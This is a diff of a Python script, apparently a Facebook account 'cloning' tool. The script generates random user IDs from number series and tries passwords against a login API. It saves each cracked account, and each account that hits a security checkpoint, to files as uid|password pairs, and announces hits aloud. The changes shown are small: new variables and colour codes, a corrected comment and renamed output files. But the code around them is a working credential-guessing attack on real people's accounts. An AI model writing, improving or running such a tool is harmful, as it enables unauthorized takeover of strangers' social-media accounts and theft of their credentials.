@@ -25,7 +25,13 @@ from urllib.parse import urlencode
 from concurrent.futures import ThreadPoolExecutor as tred
 from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
-ugen = []
+loop,count,oks,cps,twf,usragent,ugen,okhbros,uas=0,0,[],[],[],[],[],[],[]
+
+y = "\x1b[38;5;46m"
+g = "\x1b[38;5;46m"
+s = "\x1b[38;5;46m"
+r = "\x1b[38;5;46m"
+w = "\033[1;97m"
 
 # Samsung Galaxy models 2018-2025
 samsung_models = [
@@ -571,7 +577,7 @@ def START_SERIES_CLONING(series_code):
             # For 1000 series - 11 more digits
             data = ''.join(random.choice(string.digits) for _ in range(11))
         else:
-            # For 6155, 6156, 6157 series - 11 more digits  
+            # For 6155, 6156, 6157 series - 10 more digits  
             data = ''.join(random.choice(string.digits) for _ in range(10))
         
         uid = series_code + data
@@ -680,14 +686,14 @@ def login1(uid, name="user"):
                                    verify=True).json()
                 if "session_key" in rp:
                     oks.append(uid)
-                    open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
+                    open("/sdcard/NEW_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
                     print(f'\r\033[38;5;46m[MAAZ-OK] {uid} ● {pw}\033[1;97m')
                     os.system('espeak -a 300 "OK ID Found"')
                     break
 
                 elif "www.facebook.com" in rp.get('error', {}).get('message', ''):
                     cps.append(uid)
-                    open("/sdcard/OLD_CLONING-CP.txt", "a").write(uid + "|" + pw + "\n")
+                    open("/sdcard/NEW_CLONING-CP.txt", "a").write(uid + "|" + pw + "\n")
                     print(f'\r\033[38;5;226m[MAAZ-CP] {uid} ● {pw}\033[1;97m')
                     os.system('espeak -a 300 "Checkpoint ID"')
                     break
